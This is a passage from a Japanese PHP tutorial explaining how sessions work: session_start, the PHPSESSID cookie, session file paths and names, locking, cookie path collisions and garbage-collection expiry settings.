<p>これまでに紹介した方法は全て <strong>Webブラウザ</strong> から送信されてきた情報を <strong>自身のスクリプト</strong> で処理する方法についてでした．これとは異なり， <strong>自身のスクリプト</strong> から <strong>他のスクリプト</strong> に情報を送信することも可能です．<ins>PHPスクリプトにWebブラウザの代役をさせる</ins>と考えれば分かりやすいでしょう．</p>

<p>よく使われる関数を紹介しておきます．</p>

<ul>
<li><a href="http://www.php.net/manual/ja/function.file-get-contents.php" rel="nofollow noopener" target="_blank">PHP Manual - file_get_contents</a></li>
<li><a href="http://www.php.net/manual/ja/book.curl.php" rel="nofollow noopener" target="_blank">PHP Manual - Client URL Library</a></li>
</ul>

<p>またこれらを用いて，Webページから必要な情報を抜き出す手法もあります．それは<strong>スクレイピング</strong>と呼ばれます．</p>

<ul>
<li><a href="http://qiita.com/mpyw/items/c0312271819baee09132" id="reference-66ddab2d6a2a1eed4e95">Qiita - PHPネイティブのDOMによるスクレイピング入門</a></li>
</ul>

<h1>
<span id="セッション関連あれこれ" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E9%96%A2%E9%80%A3%E3%81%82%E3%82%8C%E3%81%93%E3%82%8C"><i class="fa fa-link"></i></a>セッション関連あれこれ</h1>

<p>ここからは <a href="http://www.php.net/manual/ja/book.session.php" rel="nofollow noopener" target="_blank">セッション</a> を扱っていきます．前半で紹介した知識を前提としている箇所もあるので，忘れてしまったら戻って読み返してみてください．</p>

<h2>
<span id="セッションって何-なぜセッションが必要なの" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A3%E3%81%A6%E4%BD%95-%E3%81%AA%E3%81%9C%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%8C%E5%BF%85%E8%A6%81%E3%81%AA%E3%81%AE"><i class="fa fa-link"></i></a>セッションって何？ なぜセッションが必要なの？</h2>

<p>これまで紹介したスーパーグローバル変数 <code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code> <code>$_REQUEST</code> は，情報をユーザー側に送信させるものでした．これは，たとえ <code>$_GET</code> や <code>$_POST</code> 用のパラメータがHTMLの中に埋め込まれているものである，また一目にはユーザーにその存在を感じさせない <code>$_COOKIE</code> であったとしても，閲覧なんて当たり前，更には<ins>改竄しようと思えばいくらでも改竄できる</ins>こということを示しています．ブラウザゲームで自分の所持金をCookieで管理していたら，</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">【A】文字列になるはずのところに配列をセットしてプログラムを誤作動させる</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'money'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[];</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">【B】所持金MAX！！</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'money'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'99999999'</span><span class="p">;</span>
</pre></div>
</div>

<p>これに相当することが出来てしまうのです．【A】に関しては</p>

<p><a href="http://qiita.com/mpyw/items/2f9955db1c02eeef43ea" id="reference-1c351cb7b852bf3fa738">Qiita - $_GET, $_POSTなどを受け取る際の処理</a></p>

<p>ここで紹介しているような</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$money</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_COOKIE</span><span class="p">,</span> <span class="s1">'money'</span><span class="p">);</span>
</pre></div></div>

<p>こういったフィルタリングを行うことでエラーの発生を回避させることは出来ますが，【B】に関しては本当にそれがあり得る範囲の値であればどうしようもないですよね．これがCookieだけで管理できる情報の限界です．</p>

<p>そこで，ブラウザ側ではなく<ins>サーバー側に情報を保存する</ins>というスタンスで生まれたのが <strong>セッション</strong> なのです．</p>

<h2>
<span id="基本的な使い方は" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E4%BD%BF%E3%81%84%E6%96%B9%E3%81%AF"><i class="fa fa-link"></i></a>基本的な使い方は？</h2>

<p><a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数により <code>$_SESSION</code> 変数を準備し，あとは値の取得/代入といった操作を実行すればいいだけです．</p>

<div class="code-frame" data-lang="html+php">
<div class="code-lang"><span class="bold">マニュアルより8割ぐらい引用</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="c1">// セッションを開始</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'count'</span><span class="p">]))</span> <span class="p">{</span>
   <span class="c1">// 初回にはcountを0に初期化</span>
   <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'count'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// インクリメント</span>
<span class="o">++</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'count'</span><span class="p">];</span>

<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>あなた専用カウンター<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
    こんにちは，あなたがこのページに来たのは<span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'count'</span><span class="p">]</span><span class="cp">?&gt;</span>回目ですね．<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
    F5で更新すると再読込します．
  <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<p><a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> の前に <code>@</code> をつけているのは，不正なリクエストが来ると <strong>E_NOTICE</strong> 更には <strong>E_WARNING</strong> レベルのエラーも発生し得るからです．PHP言語の欠陥ですね，これは…．</p>

<p>（しかし，実際にWebサービスとして運用するときにはエラーは非表示になるので，必ずしもこれは必須ではありません．また，いきなりこれを付加してしまうとセッションが何らかの理由で開始出来なかったときに原因不明のバグに悩まされることもあるので，十分に注意してください．）</p>

<p>以降では，<code>@</code>をつけないことにします．</p>

<h2>
<span id="スーパーグローバル変数への代入ってタブーじゃないの" class="fragment"></span><a href="#%E3%82%B9%E3%83%BC%E3%83%91%E3%83%BC%E3%82%B0%E3%83%AD%E3%83%BC%E3%83%90%E3%83%AB%E5%A4%89%E6%95%B0%E3%81%B8%E3%81%AE%E4%BB%A3%E5%85%A5%E3%81%A3%E3%81%A6%E3%82%BF%E3%83%96%E3%83%BC%E3%81%98%E3%82%83%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>スーパーグローバル変数への代入ってタブーじゃないの？</h2>

<p>以下のように変数の存在をチェックして初期化するコードはよく見かけますよね．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">三項演算子を用いた例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">filter_input関数を活用して型チェックまで行う例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'data'</span><span class="p">);</span>
</pre></div>
</div>

<p>一方，こんな風に上書き代入しちゃうコードはあんまり見かけませんね．コーディング規約でも禁止している場合が多いと思います．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>ところが <code>$_SESSION</code> だけは例外で，<ins>直接操作することが広く認められている唯一のスーパーグローバル変数</ins>となります． </p>

<p>(但し， <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数のエラーの発生を <code>@</code> 演算子無しに防ぐために <code>$_COOKIE</code> を操作することは例外的に認められるでしょう．このコードは後ほど出てきます．)</p>

<h2>
<span id="セッションに格納できるキーは" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E6%A0%BC%E7%B4%8D%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%AD%E3%83%BC%E3%81%AF"><i class="fa fa-link"></i></a>セッションに格納できるキーは？</h2>

<p><strong>10進整数</strong> と等価でない文字列であれば何でも格納できます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">GOOD</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nine'</span><span class="p">]</span> <span class="c1">// 通常の文字列</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'010'</span><span class="p">]</span>  <span class="c1">// 8進表記文字列</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">BAD</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_SESSION</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span>   <span class="c1">// 10進表記整数</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="mo">010</span><span class="p">]</span> <span class="c1">// 8進表記整数(実質的には上記と等しい)</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'8'</span><span class="p">]</span> <span class="c1">// 10進表記文字列</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'0'</span><span class="p">]</span> <span class="c1">// 10進表記文字列</span>
</pre></div>
</div>

<h2>
<span id="セッションに格納できる値は" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E6%A0%BC%E7%B4%8D%E3%81%A7%E3%81%8D%E3%82%8B%E5%80%A4%E3%81%AF"><i class="fa fa-link"></i></a>セッションに格納できる値は？</h2>

<p><code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code> <code>$_REQUEST</code> などは <strong>文字列</strong> と <strong>配列</strong> しか扱えませんでしたが，<code>$_SESSION</code> はリソース型以外の <strong>任意のデータ</strong> を保存することが出来ます．但しオブジェクトを保存する場合，そのクラスの定義が <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数のコールよりも<ins>前に</ins>行われている必要があります．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">GOOD</span></div>
<div class="highlight"><pre><span></span><span class="k">require</span> <span class="s1">'Test.class.php'</span><span class="p">;</span>
<span class="nb">session_start</span><span class="p">();</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">BAD</span></div>
<div class="highlight"><pre><span></span><span class="nb">session_start</span><span class="p">();</span>
<span class="k">require</span> <span class="s1">'Test.class.php'</span><span class="p">;</span>
</pre></div>
</div>

<h2>
<span id="cookieとどう違うの" class="fragment"></span><a href="#cookie%E3%81%A8%E3%81%A9%E3%81%86%E9%81%95%E3%81%86%E3%81%AE"><i class="fa fa-link"></i></a>Cookieとどう違うの？</h2>

<p>既に述べたように</p>

<ul>
<li>セッションの方が保存できるデータ型が多い</li>
<li>セッションはサーバー側に保存されるのでユーザーに干渉を受けない</li>
</ul>

<p>などの違いはありますが， <strong>「Cookieとどう違うの？」</strong> という質問自体に少し語弊があります．というのも，<ins>セッションはCookieのもとに成り立っている</ins>からです．サーバー側にデータを保存したところで，それが誰のものかが分からないと意味がないですよね．これをCookieによって判別するわけですが，デフォルトでは <strong><code>'PHPSESSID'</code></strong> という名前のCookieを使って判定することになっています．以下のような処理が為されます．</p>

<ol>
<li>ユーザーが初めてページにアクセスしてくる．</li>
<li>
<a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数が初めてコールされ，このときに<br><code>Set-Cookie: PHPSESSID=d41d8cd98f00b204e9800998ecf8427e; path=/</code><br>のように他と重複しないランダムな値が自動生成されてユーザー側に送られる．</li>
<li>スクリプト内で <code>$_SESSION</code> に（必要があれば）代入などを行う．</li>
<li>スクリプト終了時， セッションファイル <code>sess_d41d8cd98f00b204e9800998ecf8427e</code> に， <code>$_SESSION</code> の内容が復元可能な形で自動的に書き込まれる．</li>
</ol>

<p>ここからは2回目のアクセスです． </p>

<ol>
<li>ユーザーが2回目にページにアクセスしてくる．</li>
<li>
<a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数がコールされると，まず<ins>最初に</ins><strong><code>$_COOKIE['PHPSESSID']</code></strong><ins>が存在しているか</ins>のチェックが行われ，それを元に該当する名前のセッションファイルが存在しているかどうかを調べる．</li>
<li>存在している場合に限り，セッションファイル <code>sess_d41d8cd98f00b204e9800998ecf8427e</code> からデータが復元され， <code>$_SESSION</code> が準備される．</li>
<li>スクリプト内で <code>$_SESSION</code> に（必要があれば）代入などを行う．</li>
<li>スクリプト終了時，  セッションファイル <code>sess_d41d8cd98f00b204e9800998ecf8427e</code> に <code>$_SESSION</code> の内容が復元可能な形で自動的に書き込まれる．</li>
</ol>

<p>以降は繰り返しです．</p>

<p><strong>2016/07/23追記</strong><br>
図を用いた分かりやすい記事があったので引用します</p>

<ul>
<li><a href="http://qiita.com/kure/items/8539532ac097bf93fd24" id="reference-b6234a88ab0e8b0f4142">PHPで確認するクッキーとセッションメモ - 訪問回数のカウント</a></li>
</ul>

<h2>
<span id="セッションファイルってどこにどんな名前で保存されてるの" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%A3%E3%81%A6%E3%81%A9%E3%81%93%E3%81%AB%E3%81%A9%E3%82%93%E3%81%AA%E5%90%8D%E5%89%8D%E3%81%A7%E4%BF%9D%E5%AD%98%E3%81%95%E3%82%8C%E3%81%A6%E3%82%8B%E3%81%AE"><i class="fa fa-link"></i></a>セッションファイルってどこにどんな名前で保存されてるの？</h2>

<p>セッションを識別するための3つの概念を述べます．</p>

<ul>
<li>セッション用Cookieの名前</li>
<li>セッション用Cookieの値</li>
<li>セッションファイルの保存パス</li>
</ul>

<p>これらは，以下の何れかの方法で設定または取得することができます．</p>

<ul>
<li>php.iniの編集</li>
<li>
<a href="http://www.php.net/manual/ja/function.ini-set.php" rel="nofollow noopener" target="_blank">ini_set</a> 関数または <a href="http://www.php.net/manual/ja/function.ini-get.php" rel="nofollow noopener" target="_blank">ini_get</a> 関数</li>
<li>
<a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数の第1引数 (PHP7.0以降のみで使えるオプション)</li>
<li>専用の関数</li>
</ul>

<h3>
<span id="セッション用cookieの名前" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%94%A8cookie%E3%81%AE%E5%90%8D%E5%89%8D"><i class="fa fa-link"></i></a>セッション用Cookieの名前</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">これらのうちいずれかを使う</span></div>
<div class="highlight"><pre><span></span><span class="c1">// 取得</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">();</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'session.save_path'</span><span class="p">);</span>

<span class="c1">// 設定</span>
<span class="nb">session_save_path</span><span class="p">(</span><span class="s1">'/tmp'</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.save_path'</span><span class="p">,</span> <span class="s1">'/tmp'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">([</span><span class="s1">'save_path'</span> <span class="o">=&gt;</span> <span class="s1">'/tmp'</span><span class="p">]);</span> <span class="c1">// PHP7.0以降</span>
</pre></div>
</div>

<ul>
<li>取得は常に可能です．</li>
<li>設定は <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数をコールする <strong>前</strong> でなければなりません．</li>
<li>デフォルト値は空であり，その場合 <a href="http://www.php.net/manual/ja/function.sys-get-temp-dir.php" rel="nofollow noopener" target="_blank">sys_get_temp_dir</a> 関数の返り値で取れる，システム既定のテンポラリディレクトリが使われます．</li>
</ul>

<h3>
<span id="セッション用cookieの名前-1" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%94%A8cookie%E3%81%AE%E5%90%8D%E5%89%8D-1"><i class="fa fa-link"></i></a>セッション用Cookieの名前</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">これらのうちいずれかを使う</span></div>
<div class="highlight"><pre><span></span><span class="c1">// 取得</span>
<span class="nv">$name</span> <span class="o">=</span> <span class="nb">session_name</span><span class="p">();</span>
<span class="nv">$name</span> <span class="o">=</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'session.name'</span><span class="p">);</span>

<span class="c1">// 設定</span>
<span class="nb">session_name</span><span class="p">(</span><span class="s1">'MYSESSID'</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.name'</span><span class="p">,</span> <span class="s1">'MYSESSID'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">([</span><span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'MYSESSID'</span><span class="p">]);</span> <span class="c1">// PHP7.0以降</span>
</pre></div>
</div>

<ul>
<li>取得は常に可能です．</li>
<li>設定は <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数をコールする <strong>前</strong> でなければなりません．</li>
<li>デフォルト値があらかじめ <strong><code>'PHPSESSID'</code></strong> として設定されています．</li>
</ul>

<h3>
<span id="セッション用cookieの値" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%94%A8cookie%E3%81%AE%E5%80%A4"><i class="fa fa-link"></i></a>セッション用Cookieの値</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="c1">// 取得</span>
<span class="nv">$id</span> <span class="o">=</span> <span class="nb">session_id</span><span class="p">();</span>

<span class="c1">// 設定</span>
<span class="nb">session_id</span><span class="p">(</span><span class="s1">'vmtflhhks040679m9rq6044ps0'</span><span class="p">);</span>
</pre></div></div>

<ul>
<li>取得は <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数をコールした <strong>後</strong> でなければなりません．コールする前には(設定を行っていなければ) <strong>空文字列</strong> が返されます．</li>
<li>設定は <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数をコールする <strong>前</strong> でなければなりません．</li>
<li>設定を行えば， <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> コール時に強制的にそれをセッションIDとして利用させることが出来ます．</li>
<li>設定を行わなければ， <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> コール時に <strong><code>$_COOKIE[session_name()]</code></strong> の値が利用されます．</li>
</ul>

<p>以上を踏まえて，セッションファイルが保存されているパスは以下のように表現できるでしょう．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$path</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s1">'/sess_'</span> <span class="o">.</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="nb">session_name</span><span class="p">()];</span>
</pre></div></div>

<p><a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数をコールした <strong>後</strong> であれば</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$path</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s1">'/sess_'</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">();</span>
</pre></div></div>

<p>とすることも出来ます．</p>

<h2>
<span id="他のユーザーと競合しないの" class="fragment"></span><a href="#%E4%BB%96%E3%81%AE%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%A8%E7%AB%B6%E5%90%88%E3%81%97%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>他のユーザーと競合しないの？</h2>

<p>上で述べたとおり， <code>$_SESSION</code> は<ins>セッションIDごとに用意される</ins>ので，競合する心配はありません．但し，</p>

<ul>
<li>悪意のあるユーザーが何らかの手段を使って他のユーザーのセッションIDを <strong>盗み出し</strong> ， <code>Cookie: PHPSESSID=セッションID</code> として送信した</li>
<li>スクリプト内で <a href="http://www.php.net/manual/ja/function.session-id.php" rel="nofollow noopener" target="_blank">session_id</a> 関数を使ってセッションIDを <strong>固定して</strong> いる</li>
</ul>

<p>これらに該当する場合は複数のユーザーでセッションが共有されることになるでしょう．</p>

<h2>
<span id="多重実行で自分自身と競合しないの" class="fragment"></span><a href="#%E5%A4%9A%E9%87%8D%E5%AE%9F%E8%A1%8C%E3%81%A7%E8%87%AA%E5%88%86%E8%87%AA%E8%BA%AB%E3%81%A8%E7%AB%B6%E5%90%88%E3%81%97%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>多重実行で自分自身と競合しないの？</h2>

<p>セッションファイルは <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 実行からスクリプト終了時まで <strong>排他ロック</strong> されるので，競合の心配はありません．2回目以降のアクセスでまだ1回目の処理が終わっていないとき， <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> が記述されている行で<ins>1回目の処理が終わるまで待機し続けます</ins>．</p>

<h2>
<span id="同一サーバー内にある他のサイトのセッションと競合しないの" class="fragment"></span><a href="#%E5%90%8C%E4%B8%80%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E5%86%85%E3%81%AB%E3%81%82%E3%82%8B%E4%BB%96%E3%81%AE%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A8%E7%AB%B6%E5%90%88%E3%81%97%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>同一サーバー内にある他のサイトのセッションと競合しないの？</h2>

<p>Cookieの項目で</p>

<blockquote>

<h5>
<span id="path-1" class="fragment"></span><a href="#path-1"><i class="fa fa-link"></i></a><code>$path</code>
</h5>

<p>どこの階層から送信を行うかを表したパス．省略した場合は <strong>スクリプトが存在しているディレクトリ</strong> を指定したと見なされる．</p>
</blockquote>

<p>と紹介しましたが，先ほどのセッションの項目では</p>

<blockquote>
<p><a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数が初めてコールされ，このときに<br><code>Set-Cookie: PHPSESSID=d41d8cd98f00b204e9800998ecf8427e; path=/</code><br>のように他と重複しないランダムな値が自動生成されてユーザー側に送られる．</p>
</blockquote>

<p>として説明しました．これに違和感を感じられたのであればあなたは鋭い目をお持ちです．<ins>セッション用Cookieのデフォルトの</ins><strong><code>$path</code></strong><ins>は</ins><strong><code>'/'</code></strong><ins>となっています．</ins></p>

<p>これでも，<code>shopping.example.com</code>と<code>search.example.com</code>のようにサブドメインで分けてある場合は特に問題はありません．しかし， <code>example.com/shopping</code> <code>examle.com/search</code> のように<strong>パスで分けてある場合</strong>には衝突してしまいます． </p>

<p>これを解決するためには，Cookieが利用するパスを変えておく必要があります．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Cookieのパスを変更する</span></div>
<div class="highlight"><pre><span></span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.cookie_path'</span><span class="p">,</span> <span class="s1">'/foo/bar/baz'</span><span class="p">);</span>
</pre></div>
</div>

<h2>
<span id="有効期限ってどうなってるの" class="fragment"></span><a href="#%E6%9C%89%E5%8A%B9%E6%9C%9F%E9%99%90%E3%81%A3%E3%81%A6%E3%81%A9%E3%81%86%E3%81%AA%E3%81%A3%E3%81%A6%E3%82%8B%E3%81%AE"><i class="fa fa-link"></i></a>有効期限ってどうなってるの？</h2>

<p>有効期限と一口にいっても， <strong>「サーバー側のセッションファイルの有効期限」</strong> と <strong>「ユーザー側のクッキーファイルの有効期限」</strong> の2種類が存在します．</p>

<h3>
<span id="サーバー側のセッションファイルの有効期限" class="fragment"></span><a href="#%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E5%81%B4%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E6%9C%89%E5%8A%B9%E6%9C%9F%E9%99%90"><i class="fa fa-link"></i></a>サーバー側のセッションファイルの有効期限</h3>

<p>次のエントリに非常に詳しい説明があります．以下，このエントリの内容を更に噛み砕いて掲載します．</p>

<ul>
<li><a href="http://pentan.info/php/session_gc.html" rel="nofollow noopener" target="_blank">Pentan.info - セッションの有効期間とか設定とか挙動とかを調べました</a></li>
</ul>

<blockquote>
<p><code>session_start()</code> が行われたときに， <code>session.gc_probability</code> を分子， <code>session.gc_divisor</code> を分母とする確率で， <code>session.gc_maxlifetime</code> よりファイル更新日付の古いファイルを <code>session.save_path</code> から削除します．</p>
</blockquote>

<p>この個々の値はphp.iniを編集して恒久的に変更，または <a href="http://www.php.net/manual/ja/function.ini-set.php" rel="nofollow noopener" target="_blank">ini_set</a> 関数をコールして一時的に変更することが出来ます．設定は，<a href="http://php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> の実行よりも前にする必要があることに注意してください．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">これらのうちいずれかを使う</span></div>
<div class="highlight"><pre><span></span><span class="c1">// どのバージョンでも使える書き方</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.gc_maxlifetime'</span><span class="p">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">);</span>

<span class="c1">// PHP7.0以降で使える書き方</span>
<span class="nb">session_start</span><span class="p">([</span><span class="s1">'gc_maxlifetime'</span> <span class="o">=&gt;</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">]);</span>
</pre></div>
</div>

<p>デフォルトでは次のような挙動になります．</p>

<ul>
<li>有効期限は<ins>最終アクセスから</ins> <strong>24分間</strong> (1440秒) となる．</li>
<li>有効期限の過ぎたセッションファイルを毎回の実行ごとに検索して削除させるのは負荷がかかるので，デフォルトでは $\frac{1}{100}$ の確率でこの処理を行うようになっている．つまり有効期限切れのセッションファイルが発生してもすぐには削除が行われず，ある程度たまった段階でまとめて削除が行われるということを意味する．</li>
<li>有効期限の過ぎたセッションファイルにアクセスがあった場合，有効期限が<ins>再度延長される</ins>．つまり有効期限切れのセッションファイルはその時点で無意味なものになるのではなく，単にいつ削除されても構わない状態になるということを意味する．</li>
</ul>

<p>なお，この有効期限によるセッションファイルの削除は，サーバーごとに行われます．つまり，共用サーバーでは他のサイトの影響を受ける可能性があるということです．この問題を回避したい場合，有効期限の変更に加えて， <a href="http://www.php.net/manual/ja/function.session-save-path.php" rel="nofollow noopener" target="_blank">session_save_path</a> 関数または <a href="http://www.php.net/manual/ja/function.ini-set.php" rel="nofollow noopener" target="_blank">ini_set</a> 関数で自分専用のディレクトリを設けてください．</p>

<h3>
